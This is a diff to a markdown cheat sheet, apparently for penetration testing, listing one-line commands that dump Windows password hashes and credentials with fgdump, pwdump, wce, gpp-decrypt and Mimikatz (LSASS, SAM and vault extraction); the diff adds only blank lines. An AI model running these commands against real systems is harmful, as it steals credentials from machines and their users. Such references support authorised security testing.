@@ -15,7 +15,13 @@ updated_at: '2023-05-30T20:10:55.983412+00:00'
 
 Extracting passwords and hashes from files.
 
+
+
 ## Extracting Windows Hashes and Passwords
+
+
+
+
 
 **Command** ([[fgdump Dump NTLM and LM hashes from a Local Windows System]]):
 
@@ -23,11 +29,27 @@ Extracting passwords and hashes from files.
 fgdump.exe
 ```
 
+
+
+
+
+
+
+
+
 **Command** ([[pwdump7 Dump NTLM and LM hashes from a Local Windows System]]):
 
 ```bash
 PwDump7.exe
 ```
+
+
+
+
+
+
+
+
 
 **Command** ([[pwdump Dump NTLM and LM hashes from SYSTEM and SAM hive files]]):
 
@@ -35,13 +57,31 @@ PwDump7.exe
 pwdump SYSTEM SAM
 ```
 
+
+
+
+
+
+
+
+
 **Command** ([[Extract NTLM/LM Passwords from Windows Logon Sessions]]):
 
 ```bash
 wce.exe
 ```
 
+
+
+
+
+
+
 ## GPP Encrypted String
+
+
+
+
 
 **Command** ([[gpp-decrypt Extract Password from a GPP Encrypted String]]):
 
@@ -49,7 +89,15 @@ wce.exe
 gpp-decrypt $_ENCRYPTED_STRING
 ```
 
+
+
+
+
 ## Mimikatz
+
+
+
+
 
 **Command** ([[Extract Windows LM/NTLM Hashes From LSASS]]):
 
@@ -57,14 +105,38 @@ gpp-decrypt $_ENCRYPTED_STRING
 mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
 ```
 
+
+
+
+
+
+
+
+
 **Command** ([[Mimikatz Extract Windows LM/NTLM Hashes From SAM]]):
 
 ```bash
 mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
 ```
 
+
+
+
+
+
+
+
+
 **Command** ([[Mimikatz Extract Windows Saved Credentials from Vault]]):
 
 ```bash
 mimikatz.exe "log" "privilege::debug" "vault::cred" "exit"
 ```
+
+
+
+
+
+
+
+
